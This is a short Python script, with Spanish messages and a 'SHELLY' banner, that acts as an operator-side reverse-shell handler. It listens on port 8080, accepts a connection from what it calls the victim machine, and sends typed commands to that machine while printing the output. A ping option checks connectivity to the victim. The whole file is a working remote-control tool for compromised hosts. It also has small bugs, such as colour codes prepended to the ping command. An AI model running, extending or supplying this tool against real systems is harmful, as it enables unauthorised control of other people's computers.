import socket, argparse, os, datetime
from colorama import Fore, Style
d = datetime.datetime.now()
file = open('register.log', 'w')
file.write(f'[+] Shell logs started at {d}\n')
file.close()
parser = argparse.ArgumentParser()
parser.add_argument('--target', '-t', help="Indica la IP objetivo")
parser.add_argument('--ping', '-p', help="Indica la IP a la que relizar el ping de verificación")
args = parser.parse_args()
def c():
    if os.name=="nt":os.system("cls")
    else:os.system("clear")
class color:
    RED=Style.BRIGHT+Fore.RED
    WHITE=Style.BRIGHT+Fore.WHITE
    RESET=Style.RESET_ALL+Fore.RESET
def p():
    c()
    t='''
███████╗██╗  ██╗███████╗██╗     ██╗  ██╗   ██╗
██╔════╝██║  ██║██╔════╝██║     ██║  ╚██╗ ██╔╝
███████╗███████║█████╗  ██║     ██║   ╚████╔╝ 
╚════██║██╔══██║██╔══╝  ██║     ██║    ╚██╔╝  
███████║██║  ██║███████╗███████╗███████╗██║   
╚══════╝╚═╝  ╚═╝╚══════╝╚══════╝╚══════╝╚═╝  
'''
    print(color.RED+t)

if args.ping:
    c()
    try:
        if os.name=="nt":os.system(color.RED + f'ping -n 1 {args.ping}')
        else:os.system(color.RED + f'ping -c 1 {args.ping}')
        c()
        p()
        print(color.RED + '[*] Ping relizado con éxito, hay conectividad con la máquina víctima\n')
    
    except Exception as ex:
        c()
        p()
        print(color.RED + '[*] No hay conectividad con la víctima. Error: ' + ex + '\n')

elif args.target:
    H=args.target
    P=8080
    s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
    s.bind((H,P))
    s.listen(1)
    p()
    print(color.WHITE+f'[*] Escuchando conexiones en {H}:{P}')
    n,a=s.accept()
    print(color.WHITE+f'[+] Conexión entrante: {a[0]}:{a[1]}')
    while True:
        e=input(color.WHITE+f'shelly@{P}:~$ ')
        n.send(e.encode())
        if e.strip()=='exit':break
        o = n.recv(1024).decode()
        print(color.WHITE+o)
    n.close()

else:
    c()
    p()
    print(color.WHITE + '[*] Error: No argument found\n' + color.RESET)
